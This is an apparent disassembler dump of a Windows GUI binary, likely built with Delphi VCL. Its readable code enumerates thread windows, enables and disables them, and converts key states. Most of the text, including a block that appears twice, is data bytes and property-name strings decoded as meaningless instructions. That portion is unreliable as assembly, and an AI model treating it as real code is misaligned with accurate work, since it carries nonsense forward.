add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ ebx + edx * 8 ] dl
inc ebp
add [ eax ] dl
jb r-xdata
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
push 0x45
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x6b
dec esp
pop eax
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc esp
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
push 0x45
add al bh
shr [ edx + 0x45 ] 0x0
clc
popad
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
add ah bh
jbe r-xdata
inc esp
add al [ eax ]
add ah bl
pop eax
inc ebp
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
mov ah 0x89
clc
inc ebp
sub_4562ed
inc esp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
jmp edx
jo r-xdata
inc eax
add [ esp - 0x5b3fffbb ] dh
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
outsb
jne r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
push esi
inc ebp
add [ eax ] dh
add al [ eax ]
[ eax + 0x40045a4 ]
mov eax [ 0x45 ]
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
outsb
sub al 0x57
inc ebp
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
mov eax 0x40004594
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
inc [ eax - 0x3fffbc05 ]
xchg ecx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
jne r-xdata
jpe r-xdata
popad
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
sub eax [ edx ]
add bh bh
mov al 0xa5
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
add al 0xa1
jb r-xdata
push ecx
dec esp
jns r-xdata
outsb
inc ebx
dec edi
dec eax
in eax dx
inc esp
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
add [ 0x63530600 ] dh
push eax
inc ebp
add [ edx + eax ] cl
add bh bh
adc [ ecx - 0x5efbffbb ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
dec esp
les edi [ ebx + 0xc80043 ]
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x45 ] bl
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc ecx
jns r-xdata
add [ eax + 0x2 ] bl
add bh bh
push esp
mov [ 0xffffffffa1040045 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec edi
outsb
inc esp
jb r-xdata
sbb [ ecx + 0x1b00043 ] bh
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
outsb
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
jns r-xdata
dec esp
jae r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ ecx ]
push ecx
outsb
push edx
jae r-xdata
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
adc al 0xb8
inc ebx
add al ch
add [ eax ] al
jb r-xdata
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
inc ebx
insb
outsd
jae r-xdata
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
push esp
mov ebx 0xc00043
add bh bh
rol [ eax ] 0x0
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x4c6f666e
jns r-xdata
outsb
outsw
dec esp
jo r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
add [ eax + 0x4f0a0044 ] al
mov ecx 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebx
add al bl
add [ eax ] eax
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
jbe r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x38 ] bp
mov edx 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ 0x65476e4f ] cl
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
add [ eax ] al
or [ ecx ] 0xa
je r-xdata
outsb
dec eax
imul esp [ ebp - 0x80 ] 0xa8004558
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
mov eax 0xe80043
add bh bh
call 0x5446689
mov eax [ 0x45 ]
add [ eax - 0x80000000 ] al
dec ecx
add [ edx ] cl
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
mov al [ 0x4ff0002 ]
mov eax [ 0x45 ]
add [ eax - 0x80000000 ] al
inc esi
jo r-xdata
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
add [ esi ] al
dec edi
add al [ eax ]
jns r-xdata
outsd
jne r-xdata
push ebp
jo r-xdata
insb
fdivr [ ebx + eax * 2 + 0x14000 ]
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
add al dl
add al [ eax ]
call eax
jns r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
mov esp 0x1380043
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
outsd
arpl [ ebx + 0x10 ] bp
mov edx 0x1f00043
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror ah 0x69
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 ] cl
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xba7c776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
rol [ edx ] 0x0
jns r-xdata
add [ edi ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
push edi
push 0xdc6c6565
mov esp 0x1400043
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
je r-xdata
jpe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
inc esp
outsb
dec ebp
fdivr [ ebx + eax * 2 + 0x14800 ]
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add [ eax + 0x180045d4 ] al
mov [ ebp ] es
and al 0x8d
inc ebp
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ ebx + edx * 8 ] dl
inc ebp
add [ eax ] dl
jb r-xdata
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
push 0x45
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x6b
dec esp
pop eax
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc esp
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
push 0x45
add al bh
shr [ edx + 0x45 ] 0x0
clc
popad
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
add ah bh
jbe r-xdata
inc esp
add al [ eax ]
add ah bl
pop eax
inc ebp
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
mov ah 0x89
clc
inc ebp
sub_456bb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x6c
inc ebp
add [ esp + ebp * 2 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
insb
inc ebp
add [ eax + 0x4000000 ] ah
mov eax [ ecx ]
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x27 ] bl
inc ebp
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
hlt
sub_456c6c
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al dl
0xa8c00045 0x41
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
nop
aam 0x6c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp * 2 + 0x6d500045 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
insd
inc ebp
add [ eax + 0x1 ] al
add [ eax ] al
add al 0x8b
inc ecx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
sub_456d80
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_456dcc
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460574
mov eax [ rw-data ]
call sub_41fe78
mov eax [ rw-data ]
call sub_41fe20
retn
push 0x0
push eax
call ShowOwnedPopups
sub_456e04
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_456e54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_456ef7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_456ec0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_456e04
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456efe
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_456f08
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4027d4
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_456f40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_456fa4
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_456f40
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_457000
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_457020
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_457000
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45704c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45daac
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45df1c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_40802c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45da98
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df08
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_40802c
test eax eax
je r-xdata
sub_4570cc
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_457120
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45715c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4571a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457206
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454d64
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404184
mov eax [ ebp - 0x8 ]
pop edx
call sub_40802c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45720d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_457218
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_457240
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4572b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_457218
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572b8
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
sub_4572c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_457350
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a7dc
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_457c18
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_457bf8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_457aa8
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4573a0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_457558
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_440a38
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_457aa8
xor edx edx
mov eax ebx
call sub_457aa8
jmp r-xdata
sub_4573d8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
